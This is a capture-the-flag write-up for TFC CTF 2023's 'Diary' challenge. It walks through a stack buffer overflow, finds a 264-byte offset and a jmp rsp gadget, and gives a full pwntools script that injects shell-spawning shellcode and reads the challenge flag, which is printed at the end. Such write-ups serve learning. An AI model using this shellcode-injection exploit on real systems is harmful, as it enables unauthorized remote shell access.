# Diary

## Description

By `tomadimitrie`

How was your day?

Downloads: [diary](https://drive.google.com/file/d/1P8aI-e-_aqZkVEA0COqlR9GNFgKXkOL_/view?usp=sharing)

## Solution

Basis file checks:
```bash
└─$ file diary       
diary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b2f2295d7671e60292eff44fc0840c947545e67e, for GNU/Linux 3.2.0, not stripped

└─$ checksec  ./diary
[*] '/home/kali/Desktop/TFC-CTF-2023/diary/diary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

vuln function (from Ghidra):
```c
void vuln(void) {
  undefined8 local_108;
  ...
  <local variables declared>
  ...
  
  puts("Dear diary...");
  ...
  <local variables initialzed to 0>
  ...
  fgets((char *)&local_108,0x400,stdin);
  return;
}
```

The input buffer is undefined so let's to overflow and see what happens.

```bash
└─$ gdb -q ./diary                                             
pwndbg: loaded 136 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from ./diary...
(No debugging symbols found in ./diary)
------- tip of the day (disable with set show-tips off) -------
Use the procinfo command for better process introspection (than the GDBs info proc command)
pwndbg> !cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
pwndbg> run
Starting program: /home/kali/Desktop/TFC-CTF-2023/diary/diary 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Dear diary...
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
...
 ► 0x4012b1 <vuln+354>    ret    <0x6361617263616171>
... 
pwndbg> !unhex 6361617263616171 # Hex -> Ascii
caarcaaq
pwndbg> !cyclic -l qaac # Reversed Because LSB
264 # Offset
```

To jump to address in 64x we need `jmp rsp` gadget.

```bash
└─$ ropper --file ./diary --search "jmp rsp"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp rsp

[INFO] File: ./diary
0x000000000040114a: jmp rsp; 
```

Finally let's assembly  the pwn script.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = './diary'
elf = context.binary = ELF(exe)
context.log_level = 'INFO' # 'DEBUG'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challs.tfcctf.com", 30873)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
offset = 264

io.recvline() # Discard First Line
payload = flat(
    asm('nop') * offset,        # Padding
    pack(0x000000000040114a),   # "jmp rsp" Gadget
    asm(shellcraft.linux.sh()), # Shellcode
)
io.sendline(payload) # Get Shell
io.interactive()     # Use Shell
```

```bash
└─$ py solve.py REMOTE
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
diary
flag.txt
$ cat flag.txt
TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}
```
::: tip Flag
`TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}`
:::